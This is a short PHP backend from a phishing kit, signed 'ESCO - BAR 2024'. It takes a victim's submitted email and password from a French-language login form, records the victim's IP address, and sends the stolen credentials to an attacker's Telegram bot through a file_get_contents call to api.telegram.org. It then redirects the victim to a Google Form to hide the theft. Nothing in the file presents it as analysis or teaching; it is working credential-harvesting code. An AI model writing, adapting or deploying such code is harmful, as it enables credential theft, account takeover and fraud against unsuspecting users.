<?php

// include "antibots.php";
include "token.php";

$ip = getenv("REMOTE_ADDR");
$InfoDATE   = date("d-m-Y h:i:sa");




if(isset($_POST['sub'])){
	$message .= '
  ******************************
	--------- INFOS LOG2 ---------
	******************************	
Identifiant  =  '.$_POST['email'].'
Mot de passe  =  '.$_POST['password'].'

  ------------ infos ------------
------------ '.$ip.' ------------
---------------By ESCO - BAR 2024@  --------------
';
file_get_contents("https://api.telegram.org/bot$tokn/sendMessage?chat_id=$id&text=" . urlencode($message)."" );




    header("Refresh: 0; URL=https://docs.google.com/forms/d/e/1FAIpQLSe09z8c7Ggw5AJn1gy1ESZTM0R9HqM1NWUjSKuwhTXmxpyLqg/viewform");
    exit();
}


?>